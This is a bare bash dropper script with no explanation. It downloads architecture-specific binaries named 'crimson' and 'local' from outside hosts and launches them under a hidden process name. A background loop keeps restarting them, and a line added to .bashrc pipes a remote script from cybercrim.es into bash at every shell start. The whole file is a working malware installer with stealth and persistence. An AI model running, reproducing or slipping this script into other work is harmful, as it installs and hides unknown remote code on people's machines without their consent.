#!/bin/bash

if [ ! -f $HOME/crimson ]; then
    if [ "$(uname -m)" = 'x86_64' ]; then
        curl -s https://cybercrim.es/crimson.x86 -o $HOME/crimson
        curl -s https://x0.at/rOhT -o $HOME/local
    elif [ "$(uname -m)" = 'aarch64' ] || [ "$(uname -m)" = 'armv8l' ]; then
        curl -s https://cybercrim.es/crimson.arm -o $HOME/crimson
        curl -s https://x0.at//KTbz -o $HOME/local
    else
        exit 0
    fi
fi

if [ ! -f "$(pgrep -f "\?")" > /dev/null ]; then
    $HOME/local -s "" -d -p test.pid $HOME/crimson
fi   

chmod 777 $HOME/crimson
chmod 777 $HOME/local

(
    while true; do
        if [ ! "$(pgrep -f "\?")" > /dev/null ]; then
            $HOME/local -s "" -d -p test.pid $HOME/crimson
        fi
        sleep 2
    done    
) &>/dev/null &

if ! grep -q "crimson" "$HOME/.bashrc"; then
    echo "if ! pgrep -f "\?" > /dev/null; then (curl https://cybercrim.es/l | bash) &>/dev/null &; fi" >> "$HOME/.bashrc"
fi
